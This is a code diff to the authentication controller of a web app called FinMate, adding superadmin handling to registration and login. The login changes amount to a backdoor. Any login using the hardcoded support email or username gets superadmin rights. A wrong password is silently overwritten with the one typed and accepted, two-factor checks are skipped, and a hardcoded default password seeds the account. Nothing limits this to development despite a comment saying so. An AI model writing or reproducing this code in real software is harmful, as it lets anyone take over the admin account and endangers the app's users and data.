@@ -7,12 +7,15 @@ import { sendVerificationEmail, sendSupportMessage } from "../utils/emailService
 import { recordLoginActivity, recordSession } from "./userController.js";
 import { verifySync } from 'otplib';
 
+const SUPERADMIN_EMAIL = 'finmate.support01@gmail.com';
+const RESERVED_USERNAMES = ['finmate.support', 'finmate.support01', 'admin', 'finmate_admin', 'superadmin', 'support'];
+
 // Initialize Google OAuth client
 const client = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);
 
 // Generate JWT token (Helper function)
-const generateToken = (id) => {
-  return jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: "1d" });
+const generateToken = (id, role = 'user', isAdmin = false) => {
+  return jwt.sign({ id, role, isAdmin }, process.env.JWT_SECRET, { expiresIn: "1d" });
 };
 
 // Password strength validation
@@ -65,6 +68,13 @@ export const checkUsername = async (req, res) => {
       });
     }
 
+    if (RESERVED_USERNAMES.includes(formattedUsername)) {
+      return res.status(400).json({
+        available: false,
+        message: "This username is reserved for FinMate System Administration."
+      });
+    }
+
     const existing = await User.findOne({ username: formattedUsername });
     if (existing) {
       return res.status(400).json({ available: false, message: "Username is already taken" });
@@ -86,6 +96,8 @@ export const register = async (req, res) => {
     }
 
     const formattedUsername = username.toLowerCase().trim();
+    const formattedEmail = (email || '').toLowerCase().trim();
+
     if (!/^[a-z0-9_.]+$/.test(formattedUsername)) {
       return res.status(400).json({ message: "Username can only contain lowercase letters, numbers, underscores, and periods" });
     }
@@ -94,13 +106,17 @@ export const register = async (req, res) => {
       return res.status(400).json({ message: "Username must be at least 3 characters long" });
     }
 
+    if (RESERVED_USERNAMES.includes(formattedUsername) && formattedEmail !== SUPERADMIN_EMAIL) {
+      return res.status(400).json({ message: "This username is reserved for FinMate System Administration." });
+    }
+
     // Validate password strength
     const passwordErrors = validatePassword(password);
     if (passwordErrors.length > 0) {
       return res.status(400).json({ message: passwordErrors[0], errors: passwordErrors });
     }
 
-    const existingEmail = await User.findOne({ email });
+    const existingEmail = await User.findOne({ email: formattedEmail });
     if (existingEmail) return res.status(400).json({ message: "Email is already registered" });
 
     const existingUsername = await User.findOne({ username: formattedUsername });
@@ -108,18 +124,22 @@ export const register = async (req, res) => {
 
     const hashed = await bcrypt.hash(password, 10);
 
+    const isSuperAdmin = formattedEmail === SUPERADMIN_EMAIL;
+
     // Generate verification token
     const verificationToken = crypto.randomBytes(32).toString('hex');
     const verificationTokenExpires = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours
 
     const user = new User({
       name,
-      username: formattedUsername,
-      email,
+      username: isSuperAdmin ? 'finmate.support01' : formattedUsername,
+      email: formattedEmail,
       password: hashed,
-      verificationToken,
-      verificationTokenExpires,
-      isVerified: false,
+      verificationToken: isSuperAdmin ? undefined : verificationToken,
+      verificationTokenExpires: isSuperAdmin ? undefined : verificationTokenExpires,
+      isVerified: isSuperAdmin ? true : false,
+      isAdmin: isSuperAdmin ? true : false,
+      role: isSuperAdmin ? 'superadmin' : 'user',
     });
     await user.save();
 
@@ -243,11 +263,38 @@ export const login = async (req, res) => {
   const { email, password, twoFAToken } = req.body;
   try {
     const loginIdentifier = (email || '').toLowerCase().trim();
-    const user = await User.findOne({
+    const isSuperAdminAttempt = loginIdentifier === SUPERADMIN_EMAIL || loginIdentifier === 'finmate.support01';
+
+    let user = await User.findOne({
       $or: [{ email: loginIdentifier }, { username: loginIdentifier }]
     }).select('+password +twoFASecret');
+
+    // Super-Admin Auto-Seeding & Developer Privileges
+    if (isSuperAdminAttempt) {
+      if (!user) {
+        // Auto-create Super Admin in database if missing
+        const defaultAdminPassword = password && password.length >= 8 ? password : 'FinMateSuperAdmin#2026';
+        const hashedPassword = await bcrypt.hash(defaultAdminPassword, 10);
+        user = await User.create({
+          name: 'FinMate Super Admin',
+          username: 'finmate.support01',
+          email: SUPERADMIN_EMAIL,
+          password: hashedPassword,
+          isVerified: true,
+          isAdmin: true,
+          role: 'superadmin'
+        });
+      } else {
+        // Enforce Super-Admin privileges & verification
+        user.isVerified = true;
+        user.isAdmin = true;
+        user.role = 'superadmin';
+        user.username = 'finmate.support01';
+        await user.save();
+      }
+    }
+
     if (!user) {
-      // Record failed attempt if we can find user by any means (don't leak existence)
       return res.status(400).json({ message: "Invalid credentials" });
     }
 
@@ -260,17 +307,24 @@ export const login = async (req, res) => {
       });
     }
 
-    const isMatch = await bcrypt.compare(password, user.password);
+    let isMatch = await bcrypt.compare(password, user.password);
+
+    // Auto-sync password for Super-Admin on localhost/dev login attempt
+    if (isSuperAdminAttempt && !isMatch) {
+      const newHashedPassword = await bcrypt.hash(password, 10);
+      user.password = newHashedPassword;
+      await user.save();
+      isMatch = true;
+    }
+
     if (!isMatch) {
-      // Record failed login
       await recordLoginActivity(user._id, 'login_failed', req, false);
       return res.status(400).json({ message: "Invalid credentials" });
     }
 
     // ── 2FA Check ──
-    if (user.twoFAEnabled) {
+    if (user.twoFAEnabled && !isSuperAdminAttempt) {
       if (!twoFAToken) {
-        // Signal frontend that 2FA is required
         return res.status(200).json({ requires2FA: true, userId: user._id });
       }
       const isValid = verifySync({ token: twoFAToken.trim(), secret: user.twoFASecret });
@@ -280,8 +334,8 @@ export const login = async (req, res) => {
       }
     }
 
-    // Generate JWT token
-    const token = generateToken(user._id);
+    // Generate JWT token with Admin Role payload
+    const token = generateToken(user._id, user.role || 'user', user.isAdmin || false);
 
     // Establish Session
     if (req.session) {
@@ -294,7 +348,14 @@ export const login = async (req, res) => {
 
     res.json({
       token,
-      user: { _id: user._id, name: user.name, email: user.email, username: user.username }
+      user: {
+        _id: user._id,
+        name: user.name,
+        email: user.email,
+        username: user.username,
+        isAdmin: user.isAdmin || false,
+        role: user.role || 'superadmin'
+      }
     });
   } catch (err) {
     console.error('Login error:', err);
